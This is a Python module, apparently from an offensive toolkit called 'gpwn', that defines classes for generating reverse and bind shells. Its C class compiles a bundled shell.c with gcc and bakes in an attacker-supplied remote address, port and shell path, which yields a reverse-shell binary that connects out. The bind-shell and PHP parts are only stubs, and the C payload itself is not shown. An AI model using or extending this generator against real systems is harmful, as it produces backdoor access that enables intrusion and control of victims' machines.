import os
import logging
from subprocess import Popen, PIPE, check_output

from gpwn.resources import get_path
from gpwn.exceptions import ShellError

logger = logging.getLogger('root').getChild(__name__)


class Shell:
    def __init__(self, address: str, port: int):
        self.address = address
        self.port = port

    def generate_reverse_shell(self):
        logger.error("reverse shell not implemented")

    def generate_bind_shell(self):
        logger.error("bind shell not implemented")


class C(Shell):
    def __init__(self, address: str, port: int, shell: str):
        Shell.__init__(self, address=address, port=port)
        self.shell = shell

    def generate_reverse_shell(self):
        self.validate()

        shell = "\"%s\"" % self.shell
        port = self.port
        address = "\"%s\"" % self.address
        path = os.path.join(get_path(), 'shell.c')
        logger.debug("compiling: %s -DREMOTE_ADDR=%s -DREMOTE_PORT=%s -DSHELL=%s", path, address, port, shell)
        pipe = Popen(
            ["gcc", path, "-o", "shell", "-DREMOTE_ADDR=%s" % address, "-DREMOTE_PORT=%s" % port, "-DSHELL=%s" % shell,
             "-Wno-implicit-function-declaration"])
        logger.info(pipe.stdout)

    def validate(self):
        if self.address is None:
            raise ShellError('Missing or invalid address')
        if self.port is None:
            raise ShellError('Missing or invalid port')


class Php(Shell):
    def __init__(self, address: str, port: int):
        Shell.__init__(self, address=address, port=port)
